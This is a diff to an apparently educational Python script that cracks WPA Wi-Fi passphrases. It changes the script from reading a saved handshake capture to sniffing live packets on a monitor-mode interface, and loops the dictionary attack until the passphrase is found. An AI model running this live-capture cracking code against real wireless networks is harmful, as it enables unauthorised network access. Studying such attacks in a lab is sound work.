@@ -47,8 +47,8 @@ def main():
     crypto = b''
     mic_to_test = b''
 
-    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
-    wpa = rdpcap("wpa_handshake.cap")
+    # Get 1000 packages from the monitor interface
+    wpa = sniff(iface='wlp1s0mon', count=1000)
 
     # The network to attack
     ssid = "SWI"
@@ -130,8 +130,11 @@ def main():
         # Test if the current passphrase is valid
         if mic_to_test == mic.hexdigest()[:32]:
             print("You win ! The passphrase is : " + passPhrase.decode())
-            break
+            return False
+
+    return True
 
 
 if __name__ == '__main__':
-    main()
+    while main():
+        print("New loop")
